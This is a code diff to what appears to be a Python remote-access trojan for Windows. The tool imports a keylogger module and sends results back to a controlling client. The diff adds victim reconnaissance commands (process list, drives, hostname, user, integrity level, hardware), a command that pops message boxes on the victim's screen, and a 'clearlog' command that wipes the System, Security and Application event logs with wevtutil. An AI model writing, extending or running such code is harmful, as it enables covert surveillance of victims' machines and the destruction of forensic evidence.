@@ -6,6 +6,8 @@ import inspect
 import json
 import locale
 import os
+import platform
+import re
 import shutil
 import socket
 import sqlite3
@@ -32,6 +34,7 @@ import win32profile
 import win32security
 import win32service
 import win32ts
+import wmi
 from Crypto.Cipher import AES
 
 import keylogger
@@ -492,7 +495,7 @@ class Command:
                          (winreg.HKEY_CURRENT_USER, 0)):
                 software_list += Helper.enum_uninstall_key(*item)
             return 1, tabulate.tabulate(sorted(software_list, key=lambda s: s[0].lower()),
-                                        headers=['Name', 'Version', 'Publisher']),
+                                        headers=['Name', 'Version', 'Publisher'])
         except Exception as exception:
             return 0, '[-] Error: ' + str(exception)
 
@@ -520,6 +523,88 @@ class Command:
                 client.send_text(0, '[-] ' + str(response.status_code))
         except Exception as exception:
             client.send_text(0, '[-] Error: ' + str(exception))
+
+    @staticmethod
+    def ps():
+        try:
+            processes = []
+            for proc in psutil.process_iter():
+                try:
+                    process = [proc.pid, proc.name(), proc.exe()]
+                    processes.append(process)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    pass
+            return 1, tabulate.tabulate(processes, headers=['PID', 'Name', 'Executable path']) + os.linesep
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def drives():
+        try:
+            parts = []
+            partitions = psutil.disk_partitions()
+            for partition in partitions:
+                try:
+                    partition_usage = psutil.disk_usage(partition.mountpoint)
+                except PermissionError:
+                    continue
+                part = [partition.device, partition.fstype, Helper.get_readable_size(partition_usage.total),
+                        Helper.get_readable_size(partition_usage.used),
+                        Helper.get_readable_size(partition_usage.free), str(partition_usage.percent) + ' %']
+                parts.append(part)
+
+            return 1, tabulate.tabulate(parts,
+                                        headers=['Mount point', 'File system', 'Total size', 'Used', 'Free',
+                                                 'Percentage']) + os.linesep
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def get_info():
+        try:
+            computer = wmi.WMI()
+            computer_info = computer.Win32_ComputerSystem()[0]
+            gpu_info = computer.Win32_VideoController()[0]
+            proc_info = computer.Win32_Processor()[0]
+            info = {'pid': psutil.Process().pid, 'username': psutil.Process().username(), 'exec_path': EXECUTABLE_PATH,
+                    'intgty_lvl': Helper.get_integrity_level(),
+                    'hostname': platform.node(), 'platform': platform.system(), 'version': platform.version(),
+                    'architecture': platform.machine(), 'manufacturer': computer_info.Manufacturer,
+                    'model': computer_info.Model,
+                    'ram': str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB', 'cpu': proc_info.Name,
+                    'graphic_card': gpu_info.name}
+            result = ''
+            for k, v in info.items():
+                result += '{0:15}{1}'.format(k, v) + '\n'
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def msgbox(msg):
+        try:
+            msg = re.findall('[\']([^\']*)[\']', msg)
+            if len(msg) != 2:
+                return 0, '[-] Two arguments required'
+            threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(None, msg[0], msg[1], 0),
+                             daemon=True).start()
+            return 1, '[+] Success'
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def clearlog():
+        try:
+            cmd_list = [r'wevtutil cl System',
+                        r'wevtutil cl Security',
+                        r'wevtutil cl Application']
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
 
 
 class Helper:
@@ -682,6 +767,29 @@ class Helper:
             except EnvironmentError:
                 continue
         return software_list
+
+    @staticmethod
+    def get_readable_size(bytes, suffix='B'):
+        factor = 1024
+        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
+            if bytes < factor:
+                return f'{bytes:.2f}{unit}{suffix}'
+            bytes /= factor
+
+    @staticmethod
+    def get_integrity_level():
+        intgty_lvl = {
+            0x0000: 'Untrusted',
+            0x1000: 'Low',
+            0x2000: 'Medium',
+            0x2100: 'Medium high',
+            0x3000: 'High',
+            0x4000: 'System',
+            0x5000: 'Protected process',
+        }
+        handle_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_READ)
+        sid = win32security.GetTokenInformation(handle_token, ntsecuritycon.TokenIntegrityLevel)[0]
+        return intgty_lvl.get(sid.GetSubAuthority(sid.GetSubAuthorityCount() - 1))
 
 
 while True:
